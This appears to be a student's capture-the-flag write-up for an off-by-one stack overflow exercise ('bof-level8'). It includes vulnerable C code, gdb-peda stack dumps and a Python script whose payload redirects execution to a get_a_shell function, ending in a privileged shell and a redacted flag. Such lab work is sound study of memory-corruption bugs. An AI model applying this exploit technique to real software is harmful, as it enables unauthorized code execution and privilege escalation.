-----------------
bof-level8_
----------------
1.
where is get_a_shell
0x000000000040067a  get_a_shell

2.how many buffer bytes it has
 cat bof-level8.c
void receive_input() {
    char buf[128];
    fgets(buffer, 256, stdin);
    for(i=0; i<=128; ++i) {
        buf[i] = buffer[i];
    }
}

3. 
where is the buffer start address
 gdb ./bof-level8 
Reading symbols from ./bof-level8...(no debugging symbols found)...done.
gdb-peda$ b *receive_input +101
Breakpoint 1 at 0x400727
gdb-peda$ r
Starting program: /home/users/nintyfour/week2/bof-level8/bof-level8 
Now, the developer is trained a bit more, however,
still the vulnerability exists. 1-byte overflow in the buffer,
which is off-by-one vulnerability!
Can you exploit this program?
1234


[----------------------------------registers-----------------------------------]
RAX: 0x81 
RBX: 0x0 
RCX: 0x80 
RDX: 0x0 
RSI: 0x602425 --> 0x0 
RDI: 0x601085 --> 0x0 
RBP: 0x7fffffffe3c0 --> 0x7fffffffe300 --> 0x7fffffffe4d0 --> 0x1 
RSP: 0x7fffffffe340 --> 0xa34333231 ('1234\n')
RIP: 0x400727 (<receive_input+101>:	leaveq)
R8 : 0x602425 --> 0x0 
R9 : 0x7ffff7fda700 (0x00007ffff7fda700)
R10: 0x7ffff7fda700 (0x00007ffff7fda700)
R11: 0x246 
R12: 0x400590 (<_start>:	xor    %ebp,%ebp)
R13: 0x7fffffffe4d0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40071a <receive_input+88>:	mov    0x200a60(%rip),%eax        # 0x601180 <i>
   0x400720 <receive_input+94>:	cmp    $0x80,%eax
   0x400725 <receive_input+99>:	jle    0x4006ef <receive_input+45>
=> 0x400727 <receive_input+101>:	leaveq 
   0x400728 <receive_input+102>:	retq   
   0x400729 <run>:	push   %rbp
   0x40072a <run+1>:	mov    %rsp,%rbp
   0x40072d <run+4>:	sub    $0x10,%rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe340 --> 0xa34333231 ('1234\n')
0008| 0x7fffffffe348 --> 0x0 
0016| 0x7fffffffe350 --> 0x0 
0024| 0x7fffffffe358 --> 0x0 
0032| 0x7fffffffe360 --> 0x0 
0040| 0x7fffffffe368 --> 0x0 
0048| 0x7fffffffe370 --> 0x0 
0056| 0x7fffffffe378 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400727 in receive_input ()
gdb-peda$ x/100wx $rsp
0x7fffffffe340:	0x34333231	0x0000000a	0x00000000	0x00000000<-here
0x7fffffffe350:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe360:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe370:	0x00000000	0x00000000	0x00000000	0x00000000
4.
how about the control byte

                                     _8bytes_  ________8bytes_____
				    /	     |/ 	          \		
[      buffer                  ][1][saved ebp][ret_addr in receive]
|                                  |
0                                 113
 \___________________________128_________________________________/
5.
write the python code 
#0x7f ff ff ff e3 40: 0x34333231  0x0000000a  0x00000000  0x00000000
#0x00 00 00 00 00 40 06 7a  get_a_shell

#!/usr/bin/env python
with open('input.txt','wb') as f:
        f.write("xxxxxxxx"+"\x7a\x06\x40\x00\x00\x00\x00\x00" + "aaaaaaaa" * (112/8-2)+"bbbbbbbb"+"cccccccc"+"\x40\xe3\xff\xff\xff\x7f")

6.run it 
$ (cat input.txt;cat) | ./bof-level8
Now, the developer is trained a bit more, however,
still the vulnerability exists. 1-byte overflow in the buffer,
which is off-by-one vulnerability!
Can you exploit this program?


Segmentation fault (core dumped)

nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level8
$ gdb --core=core
[New LWP 8999]

warning: Unexpected size of section `.reg-xstate/8999' in core file.
Core was generated by `./bof-level8'.
Program terminated with signal SIGSEGV, Segmentation fault.

warning: Unexpected size of section `.reg-xstate/8999' in core file.
#0  0x0000000000400764 in ?? ()
gdb-peda$ x/100xw $rsp-0x100
0x7fffffffe248:	0xf7a875e8	0x00007fff	0x00000001	0x00000000
0x7fffffffe258:	0xf7dd18e0	0x00007fff	0x00601108	0x00000000
0x7fffffffe268:	0xf7a8860e	0x00007fff	0x00000000	0x00000000
0x7fffffffe278:	0xf7a7bc6a	0x00007fff	0xf7dd18e0	0x00007fff
0x7fffffffe288:	0x00601080	0x00000000	0xf7dd18e0	0x00000001
0x7fffffffe298:	0x00000000	0x00000000	0x00601080	0x00000000
0x7fffffffe2a8:	0xf7dd18e0	0x00007fff	0x00601080	0x00000000
0x7fffffffe2b8:	0x00000000	0x00000000	0xffffe490	0x00007fff
0x7fffffffe2c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe2d8:	0xf7a7ab7d	0x00007fff	0x00000000	0x00000000
0x7fffffffe2e8:	0xffffe380	0x00007fff	0x00400590	0x00000000
0x7fffffffe2f8:	0x004006e3	0x00000000	0x78787878	0x78787878<-here
0x7fffffffe308:	0x0040067a	0x00000000	0x61616161	0x61616161
0x7fffffffe318:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe328:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe338:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe348:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe358:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe368:	0x61616161	0x61616161	0x62626262	0x62626262
7. 
change the python code
#0x7f ff ff ff e3 40: 0x34333231  0x0000000a  0x00000000  0x00000000
#0x00 00 00 00 00 40 06 7a  get_a_shell
#0x7fffffffe2f8:    0x004006e3  0x00000000  0x78787878  0x78787878
#!/usr/bin/env python
with open('input.txt','wb') as f:
        f.write("xxxxxxxx"+"\x7a\x06\x40\x00\x00\x00\x00\x00" + "aaaaaaaa" * (112/8-2)+"bbbbbbbb"+"cccccccc"+"\x00")

8. run it 
nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level8
$ (cat input.txt;cat) | ./bof-level8
Now, the developer is trained a bit more, however,
still the vulnerability exists. 1-byte overflow in the buffer,
which is off-by-one vulnerability!
Can you exploit this program?

Spawning a privileged shell
cat flag
cs519{XXXXXXXXXXXXXXXXXXXX}

